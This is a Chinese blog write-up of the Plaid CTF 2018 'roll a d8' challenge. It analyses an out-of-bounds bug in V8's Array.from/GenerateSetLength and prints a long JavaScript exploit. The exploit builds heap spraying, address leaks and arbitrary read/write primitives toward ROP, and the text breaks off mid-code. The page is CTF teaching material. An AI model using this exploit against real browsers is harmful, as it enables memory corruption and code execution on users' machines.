@@ -1,0 +1,351 @@
+<!DOCTYPE html>
+<!--[if lte IE 8 ]>
+<html class="ie" xmlns="http://www.w3.org/1999/xhtml" xml:lang="en-US" lang="en-US">
+<![endif]-->
+<!--[if (gte IE 9)|!(IE)]><!-->
+<!--
+***************  *      *     *
+      8          *    *       *
+      8          *  *         *
+      8          **           *
+      8          *  *         *
+      8          *    *       *
+      8          *      *     *
+      8          *        *   ***********    -----Theme By Kieran(http://go.kieran.top)
+-->
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="zh-CN" lang="zh-CN">
+<!--<![endif]-->
+
+<head>
+  <title>Plaid CTF 2018 roll a d8 | Niko&#39;s BLOG</title>
+  <!-- Meta data -->
+    <meta http-equiv="Content-Type" content="text/html" charset="UTF-8" >
+    <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta name="generator" content="Niko's BLOG">
+    <meta name="author" content="N1ko">
+    <meta name="description" content="" />
+    <meta name="keywords" content="逆向,程序分析,漏洞挖掘" />
+
+    <!-- Favicon, (keep icon in root folder) -->
+    <link rel="Shortcut Icon" href="/img/favicon.ico" type="image/ico">
+
+    <link rel="alternate" href="/atom.xml" title="Niko&#39;s BLOG" type="application/atom+xml">
+    <link rel="stylesheet" href="/css/all.css" media="screen" type="text/css">
+    
+    <link rel="stylesheet" href="/highlightjs/vs.css" type="text/css">
+    
+
+    <!--[if IE 8]>
+    <link rel="stylesheet" type="text/css" href="/css/ie8.css" />
+    <![endif]-->
+
+    <!-- jQuery | Load our jQuery, with an alternative source fallback to a local version if request is unavailable -->
+    <script src="/js/jquery-1.11.1.min.js"></script>
+    <script>window.jQuery || document.write('<script src="js/jquery-1.11.1.min.js"><\/script>')</script>
+
+    <!-- Load these in the <head> for quicker IE8+ load times -->
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+    <script src="/js/html5shiv.min.js"></script>
+    <script src="/js/respond.min.js"></script>
+    <![endif]-->
+
+  
+  
+  
+
+  <style>.col-md-8.col-md-offset-2.opening-statement img{display:none;}</style>
+</head>
+
+<!--
+<body class="post-template">
+-->
+<body id="index" class="lightnav animsition">
+
+      <!-- ============================ Off-canvas navigation =========================== -->
+
+    <div class="sb-slidebar sb-right sb-style-overlay sb-momentum-scrolling">
+        <div class="sb-close" aria-label="Close Menu" aria-hidden="true">
+            <img src="/img/close.png" alt="Close"/>
+        </div>
+        <!-- Lists in Slidebars -->
+        <ul class="sb-menu">
+            <li><a href="/" class="animsition-link" title="Home">Home</a></li>
+            <li><a href="/archives" class="animsition-link" title="archive">archives</a></li>
+            <!-- Dropdown Menu -->
+			 
+            
+        	<li>
+        		<a class="sb-toggle-submenu">Categories<span class="sb-caret"></span></a>
+            	<ul class="sb-submenu">
+				  	
+				    <li><a href="/categories/Android/" class="animsition-link">Android<small>(7)</small></a></li>
+				    
+				    <li><a href="/categories/Browser/" class="animsition-link">Browser<small>(1)</small></a></li>
+				    
+				    <li><a href="/categories/DBI/" class="animsition-link">DBI<small>(1)</small></a></li>
+				    
+				    <li><a href="/categories/Linux/" class="animsition-link">Linux<small>(1)</small></a></li>
+				    
+				    <li><a href="/categories/learn/" class="animsition-link">learn<small>(1)</small></a></li>
+				    
+				    <li><a href="/categories/tools/" class="animsition-link">tools<small>(2)</small></a></li>
+				    
+				    <li><a href="/categories/游戏/" class="animsition-link">游戏<small>(1)</small></a></li>
+				    
+				    <li><a href="/categories/论文/" class="animsition-link">论文<small>(1)</small></a></li>
+				    
+				    <li><a href="/categories/逆向/" class="animsition-link">逆向<small>(1)</small></a></li>
+				    
+				</ul>
+        	</li>
+			
+            
+            <li>
+                <a class="sb-toggle-submenu">Links<span class="sb-caret"></span></a>
+                <ul class="sb-submenu">
+                    
+                    <li><a href="http://go.kieran.top/" target="_blank" rel="noopener" class="animsition-link">Kieran</a></li>
+                    
+                </ul>
+            </li>
+            
+        </ul>
+        <!-- Lists in Slidebars -->
+        <ul class="sb-menu secondary">
+            
+            <li><a href="/about/index.html" class="animsition-link" title="about">About</a></li>
+            <li><a href="/atom.xml" class="animsition-link" title="rss">RSS</a></li>
+        </ul>
+    </div>
+    
+    <!-- ============================ END Off-canvas navigation =========================== -->
+
+    <!-- ============================ #sb-site Main Page Wrapper =========================== -->
+
+    <div id="sb-site">
+        <!-- #sb-site - All page content should be contained within this id, except the off-canvas navigation itself -->
+
+        <!-- ============================ Header & Logo bar =========================== -->
+
+        <div id="navigation" class="navbar navbar-fixed-top">
+            <div class="navbar-inner">
+                <div class="container">
+                    <!-- Nav logo -->
+                    <div class="logo">
+                        <a href="/" title="Logo" class="animsition-link">
+                         <img src="/img/logo.png" alt="Logo" width="35px;"/> 
+                        </a>
+                    </div>
+                    <!-- // Nav logo -->
+                    <!-- Info-bar -->
+                    <nav>
+                        <ul class="nav">
+                            <li><a href="/" class="animsition-link">Niko's BLOG</a></li>
+                            <li class="nolink"><span>Always </span>Creative.</li>
+                            
+                            <li><a href="https://github.com/tinyniko" title="Github" target="_blank"><i class="icon-github"></i></a></li>
+                            
+                            
+                            <li><a href="https://twitter.com/nikos233__" title="Twitter" target="_blank"><i class="icon-twitter"></i></a></li>
+                            
+                            
+                            
+                            
+                            <li class="nolink"><span>Welcome!</span></li>
+                        </ul>
+                    </nav>
+                    <!--// Info-bar -->
+                </div>
+                <!-- // .container -->
+                <div class="learnmore sb-toggle-right">More</div>
+                <button type="button" class="navbar-toggle menu-icon sb-toggle-right" title="More">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar before"></span>
+                <span class="icon-bar main"></span>
+                <span class="icon-bar after"></span>
+                </button>
+            </div>
+            <!-- // .navbar-inner -->
+        </div>
+
+        <!-- ============================ Header & Logo bar =========================== -->
+
+
+      
+<section id="intro">
+    <div class="container">
+        <div class="row col-md-offset-2">
+            <div class="col-md-8">
+    			<span class="post-meta">
+      <time datetime="2021-06-19T11:22:02.000Z" itemprop="datePublished">
+          2021-06-19
+      </time>
+    
+    
+    | 
+    <a href='/tags/exploit/'>exploit</a>,
+    
+    <a href='/tags/ctf/'>ctf</a>,
+    
+    <a href='/tags/Browser/'>Browser</a>
+    
+    
+</span>
+                <h1>Plaid CTF 2018 roll a d8</h1>
+            </div>
+        </div>
+        <div class="col-md-8 col-md-offset-2">
+      		<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这题是PCTF 2018 中的一道浏览器利用题。</p>
+<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>存在漏洞的代码如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">  void GenerateSetLength(TNode&lt;Context&gt; context, TNode&lt;Object&gt; array,</span><br><span class="line">                         TNode&lt;Number&gt; length) &#123;</span><br><span class="line">    Label fast(this), runtime(this), done(this);</span><br><span class="line">    &#x2F;&#x2F; Only set the length in this stub if</span><br><span class="line">    &#x2F;&#x2F; 1) the array has fast elements,</span><br><span class="line">    &#x2F;&#x2F; 2) the length is writable,</span><br><span class="line">    &#x2F;&#x2F; 3) the new length is greater than or equal to the old length.</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; 1) Check that the array has fast elements.</span><br><span class="line">    &#x2F;&#x2F; TODO(delphick): Consider changing this since it does an an unnecessary</span><br><span class="line">    &#x2F;&#x2F; check for SMIs.</span><br><span class="line">    &#x2F;&#x2F; TODO(delphick): Also we could hoist this to after the array construction</span><br><span class="line">    &#x2F;&#x2F; and copy the args into array in the same way as the Array constructor.</span><br><span class="line">    &#x2F;&#x2F; 首先检查是不是FastJSArray</span><br><span class="line">    BranchIfFastJSArray(array, context, &amp;fast, &amp;runtime);</span><br><span class="line"></span><br><span class="line">    BIND(&amp;fast);</span><br><span class="line">    &#123; &#x2F;&#x2F; 如果是FastJSArray</span><br><span class="line">      TNode&lt;JSArray&gt; fast_array &#x3D; CAST(array);</span><br><span class="line">     </span><br><span class="line">      TNode&lt;Smi&gt; length_smi &#x3D; CAST(length);</span><br><span class="line"></span><br><span class="line">      TNode&lt;Smi&gt; old_length &#x3D; LoadFastJSArrayLength(fast_array);</span><br><span class="line">      CSA_ASSERT(this, TaggedIsPositiveSmi(old_length));</span><br><span class="line"></span><br><span class="line">      EnsureArrayLengthWritable(LoadMap(fast_array), &amp;runtime);</span><br><span class="line">      </span><br><span class="line">      &#x2F;&#x2F; 3) If the created array already has a length greater than required,</span><br><span class="line">      &#x2F;&#x2F;    then use the runtime to set the property as that will insert holes</span><br><span class="line">      &#x2F;&#x2F;    into the excess elements and&#x2F;or shrink the backing store.</span><br><span class="line">      &#x2F;&#x2F; old_length 是指已经存在的数组，smi 代表required大小，如果要求的大小小于老的</span><br><span class="line">      &#x2F;&#x2F; 那么执行StoreObjectFieldNoWriteBarrier， 相当于缩小数组大小</span><br><span class="line">      &#x2F;&#x2F; 可以发现，这个时候并没有对smi &gt; old_length 做处理，那可能就导致越界访问了</span><br><span class="line">      GotoIf(SmiLessThan(length_smi, old_length), &amp;runtime);</span><br><span class="line"></span><br><span class="line">      StoreObjectFieldNoWriteBarrier(fast_array, JSArray::kLengthOffset,</span><br><span class="line">                                     length_smi);</span><br><span class="line">      Goto(&amp;done);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    BIND(&amp;runtime);</span><br><span class="line">    &#123;</span><br><span class="line">      CallRuntime(Runtime::kSetProperty, context, static_cast&lt;Node*&gt;(array),</span><br><span class="line">                  CodeStubAssembler::LengthStringConstant(), length,</span><br><span class="line">                  SmiConstant(LanguageMode::kStrict));</span><br><span class="line">      Goto(&amp;done);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    BIND(&amp;done);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<p>Array.from 的代码注释参考大佬的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; ES #sec-array.from</span><br><span class="line">TF_BUILTIN(ArrayFrom, ArrayPopulatorAssembler) &#123;</span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line">  TNode&lt;JSReceiver&gt; array_like &#x3D; ToObject(context, items);</span><br><span class="line"></span><br><span class="line">  TVARIABLE(Object, array);</span><br><span class="line">  TVARIABLE(Number, length);</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; Determine whether items[Symbol.iterator] is defined:</span><br><span class="line">  IteratorBuiltinsAssembler iterator_assembler(state());</span><br><span class="line">  Node* iterator_method &#x3D;</span><br><span class="line">      iterator_assembler.GetIteratorMethod(context, array_like);</span><br><span class="line">  Branch(IsNullOrUndefined(iterator_method), &amp;not_iterable, &amp;iterable);</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; 如果可以迭代</span><br><span class="line">  BIND(&amp;iterable);</span><br><span class="line">  &#123;</span><br><span class="line">    ...</span><br><span class="line">    &#x2F;&#x2F; 返回一个数组，用于存储迭代后得到的结果</span><br><span class="line">    &#x2F;&#x2F; Construct the output array with empty length.</span><br><span class="line">    array &#x3D; ConstructArrayLike(context, args.GetReceiver());</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line">    Goto(&amp;loop);</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F;开始迭代</span><br><span class="line">    BIND(&amp;loop);</span><br><span class="line">    &#123;</span><br><span class="line">      &#x2F;&#x2F; 判断迭代是否结束</span><br><span class="line">      &#x2F;&#x2F; Loop while iterator is not done.</span><br><span class="line">      TNode&lt;Object&gt; next &#x3D; CAST(iterator_assembler.IteratorStep(</span><br><span class="line">          context, iterator_record, &amp;loop_done, fast_iterator_result_map));</span><br><span class="line">      TVARIABLE(Object, value,</span><br><span class="line">                CAST(iterator_assembler.IteratorValue(</span><br><span class="line">                    context, next, fast_iterator_result_map)));</span><br><span class="line"></span><br><span class="line">      ...</span><br><span class="line">      &#x2F;&#x2F; 将得到的结果存入array</span><br><span class="line">      &#x2F;&#x2F; Store the result in the output object (catching any exceptions so the</span><br><span class="line">      &#x2F;&#x2F; iterator can be closed).</span><br><span class="line">      Node* define_status &#x3D;</span><br><span class="line">          CallRuntime(Runtime::kCreateDataProperty, context, array.value(),</span><br><span class="line">                      index.value(), value.value());</span><br><span class="line">      GotoIfException(define_status, &amp;on_exception, &amp;var_exception);</span><br><span class="line">      </span><br><span class="line">      &#x2F;&#x2F; 索引加1</span><br><span class="line">      index &#x3D; NumberInc(index.value());</span><br><span class="line"></span><br><span class="line">      ...</span><br><span class="line">      Goto(&amp;loop);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F;迭代结束</span><br><span class="line">    BIND(&amp;loop_done);</span><br><span class="line">    &#123;</span><br><span class="line">      &#x2F;&#x2F;将迭代次数赋值给length变量</span><br><span class="line">      length &#x3D; index;</span><br><span class="line">      Goto(&amp;finished);</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line">  BIND(&amp;finished);</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; 调用GenerateSetLength，将array和迭代次数作为参数</span><br><span class="line">  &#x2F;&#x2F; Finally set the length on the output and return it.</span><br><span class="line">  GenerateSetLength(context, array.value(), length.value());</span><br><span class="line">  args.PopAndReturn(array.value());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>从上面的分析可以知道，我们的数组又越界了，这样的话，利用方式就跟35c3 krautflare的利用方式一样了。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br></pre></td><td class="code"><pre><span class="line">class Memory&#123;</span><br><span class="line">	constructor()&#123;</span><br><span class="line">		this.buf &#x3D; new ArrayBuffer(8);</span><br><span class="line">		this.f64 &#x3D; new Float64Array(this.buf);</span><br><span class="line">		this.u32 &#x3D; new Uint32Array(this.buf);</span><br><span class="line">		this.bytes &#x3D; new Uint8Array(this.buf);</span><br><span class="line">	&#125;</span><br><span class="line">	d2u(val)&#123;</span><br><span class="line">		this.f64[0] &#x3D; val;</span><br><span class="line">		let tmp &#x3D; Array.from(this.u32);</span><br><span class="line">		return tmp[1] * 0x100000000 + tmp[0];</span><br><span class="line">	&#125;</span><br><span class="line">	u2d(val)&#123;</span><br><span class="line">		let tmp &#x3D; [];</span><br><span class="line">		tmp[0] &#x3D; parseInt(val % 0x100000000);</span><br><span class="line">		tmp[1] &#x3D; parseInt((val - tmp[0]) &#x2F; 0x100000000);</span><br><span class="line">		this.u32.set(tmp);</span><br><span class="line">		return this.f64[0];</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">function hex(u)&#123;</span><br><span class="line">	return u.toString(16).padStart(16, &quot;0&quot;);</span><br><span class="line">&#125;</span><br><span class="line">var mem &#x3D; new Memory();</span><br><span class="line"></span><br><span class="line">var bufs &#x3D; [];</span><br><span class="line">var objs &#x3D; [];</span><br><span class="line">var oobArray &#x3D; [1.1];</span><br><span class="line">var maxSize &#x3D; 1028 * 8;</span><br><span class="line"></span><br><span class="line">Array.from.call(function() &#123; return oobArray; &#125;, &#123;[Symbol.iterator] : _ &#x3D;&gt; (</span><br><span class="line">	&#123;</span><br><span class="line">		counter : 0,</span><br><span class="line">		next() &#123;</span><br><span class="line">			let result &#x3D; 1.1;</span><br><span class="line">			this.counter++;</span><br><span class="line">			if (this.counter &gt; maxSize) &#123;</span><br><span class="line">				oobArray.length &#x3D; 1;</span><br><span class="line">				for (let i &#x3D; 0;i &lt; 100;i++) &#123;</span><br><span class="line">					bufs.push(new ArrayBuffer(0x1234));</span><br><span class="line">					let obj &#x3D; &#123;&#39;a&#39;: 0x4321, &#39;b&#39;: 0x9999&#125;;</span><br><span class="line">					objs.push(obj);</span><br><span class="line">				&#125;</span><br><span class="line">				return &#123;done: true&#125;;</span><br><span class="line">			&#125; else &#123;</span><br><span class="line">				return &#123;value: result, done: false&#125;;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">)&#125;);</span><br><span class="line"></span><br><span class="line">function test() &#123;&#125;	&#x2F;&#x2F;没什么用，但是去掉后栈的位置会迷之提高（地址偏低），导致后面布置ROP失败</span><br><span class="line">for (let i &#x3D; 0;i &lt; 1000;i++) &#123;</span><br><span class="line">    test();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 可控的buf在oobArray的第i个元素处</span><br><span class="line">let buf_offset &#x3D; 0;</span><br><span class="line">for(let i &#x3D; 0; i &lt; maxSize; i++)&#123;</span><br><span class="line">	let val &#x3D; mem.d2u(oobArray[i]);</span><br><span class="line">	if(val &#x3D;&#x3D;&#x3D; 0x123400000000)&#123;</span><br><span class="line">		console.log(&quot;buf_offset: &quot; + i.toString());</span><br><span class="line">		buf_offset &#x3D; i;</span><br><span class="line">        %DebugPrint(oobArray[i]);</span><br><span class="line">		oobArray[i] &#x3D; mem.u2d(0x121200000000);	&#x2F;&#x2F;修改可控buf的size，做个标记</span><br><span class="line">		oobArray[i + 3] &#x3D; mem.u2d(0x1212);</span><br><span class="line">		break;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 可控的obj在oobArray的第i个元素处</span><br><span class="line">let obj_offset &#x3D; 0</span><br><span class="line">for(let i &#x3D; 0; i &lt; maxSize; i++)&#123;</span><br><span class="line">	let val &#x3D; mem.d2u(oobArray[i]);</span><br><span class="line">	if(val &#x3D;&#x3D;&#x3D; 0x432100000000)&#123;</span><br><span class="line">		console.log(&quot;obj_offset: &quot; + i.toString());</span><br><span class="line">		obj_offset &#x3D; i;</span><br><span class="line">		oobArray[i] &#x3D; mem.u2d(0x567800000000); &#x2F;&#x2F;修改可控obj的属性a，做个标记</span><br><span class="line">		break;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; bufs中的第i个buf是可控的</span><br><span class="line">let controllable_buf_idx &#x3D; 0;</span><br><span class="line">for(let i &#x3D; 0; i &lt; bufs.length; i++)&#123;</span><br><span class="line">	let val &#x3D; bufs[i].byteLength;</span><br><span class="line">	if(val &#x3D;&#x3D;&#x3D; 0x1212)&#123;</span><br><span class="line">        %DebugPrint(bufs[i]);</span><br><span class="line">		console.log(&quot;found controllable buf at idx &quot; + i.toString());</span><br><span class="line">		controllable_buf_idx &#x3D; i;</span><br><span class="line">		break;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; objs中第i个obj是可控的</span><br><span class="line">let controllable_obj_idx &#x3D; 0;</span><br><span class="line">for(let i &#x3D; 0; i &lt; objs.length; i++)&#123;</span><br><span class="line">	let val &#x3D; objs[i].a;</span><br><span class="line">	if(val &#x3D;&#x3D;&#x3D; 0x5678)&#123;</span><br><span class="line">		console.log(&quot;found controllable obj at idx &quot; + i.toString());</span><br><span class="line">		controllable_obj_idx &#x3D; i;</span><br><span class="line">		break;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var heap_addr &#x3D; mem.d2u(oobArray[buf_offset + 1]) - 0x10</span><br><span class="line">console.log(&quot;heap_addr: 0x&quot; + heap_addr.toString(16));</span><br><span class="line"></span><br><span class="line">class arbitraryRW&#123;</span><br><span class="line">	constructor(buf_offset, buf_idx, obj_offset, obj_idx)&#123;</span><br><span class="line">		this.buf_offset &#x3D; buf_offset;</span><br><span class="line">		this.buf_idx &#x3D; buf_idx;</span><br><span class="line">		this.obj_offset &#x3D; obj_offset;</span><br><span class="line">		this.obj_idx &#x3D; obj_idx;</span><br><span class="line">	&#125;</span><br><span class="line">	leak_obj(obj)&#123;</span><br><span class="line">		objs[this.obj_idx].a &#x3D; obj;</span><br><span class="line">		return mem.d2u(oobArray[this.obj_offset]) - 1;</span><br><span class="line">	&#125;</span><br><span class="line">	read(addr)&#123;</span><br><span class="line">		let idx &#x3D; this.buf_offset;</span><br><span class="line">		oobArray[idx + 1] &#x3D; mem.u2d(addr);</span><br><span class="line">		oobArray[idx + 2] &#x3D; mem.u2d(addr);</span><br><span class="line">		let tmp &#x3D; new Float64Array(bufs[this.buf_idx], 0, 0x10);</span><br><span class="line">		return mem.d2u(tmp[0]);</span><br><span class="line">	&#125;</span><br><span class="line">	write(addr, val)&#123;</span><br><span class="line">		let idx &#x3D; this.buf_offset;</span><br><span class="line">		oobArray[idx + 1] &#x3D; mem.u2d(addr);</span><br><span class="line">		oobArray[idx + 2] &#x3D; mem.u2d(addr);</span><br><span class="line">		let tmp &#x3D; new Float64Array(bufs[this.buf_idx], 0, 0x10);</span><br><span class="line">		tmp.set([mem.u2d(val)]);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">var arw &#x3D; new arbitraryRW(buf_offset, controllable_buf_idx, obj_offset, controllable_obj_idx);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; let curr_chunk &#x3D; heap_addr;</span><br><span class="line">&#x2F;&#x2F; let searched &#x3D; 0;</span><br><span class="line">&#x2F;&#x2F; for(let i &#x3D; 0; i &lt; 0x5000; i++)&#123;</span><br><span class="line">&#x2F;&#x2F; 	let size &#x3D; arw.read(curr_chunk + 0x8);</span><br><span class="line">&#x2F;&#x2F; 	let prev_size &#x3D; arw.read(curr_chunk);</span><br><span class="line">&#x2F;&#x2F; 	if(size !&#x3D;&#x3D; 0 &amp;&amp; size % 2 &#x3D;&#x3D;&#x3D; 0 &amp;&amp; prev_size &lt;&#x3D; 0x3f0)&#123;</span><br><span class="line">&#x2F;&#x2F; 		let tmp_ptr &#x3D; curr_chunk - prev_size;</span><br><span class="line">&#x2F;&#x2F; 		let fd &#x3D; arw.read(tmp_ptr + 0x10);</span><br><span class="line">&#x2F;&#x2F; 		let bk &#x3D; arw.read(tmp_ptr + 0x18)</span><br><span class="line">&#x2F;&#x2F; 		if(parseInt(fd &#x2F; 0x10000000000) &#x3D;&#x3D;&#x3D; 0x7f)&#123;</span><br><span class="line">&#x2F;&#x2F; 			searched &#x3D; fd;</span><br><span class="line">&#x2F;&#x2F; 			break;</span><br><span class="line">&#x2F;&#x2F; 		&#125;else if(parseInt(bk 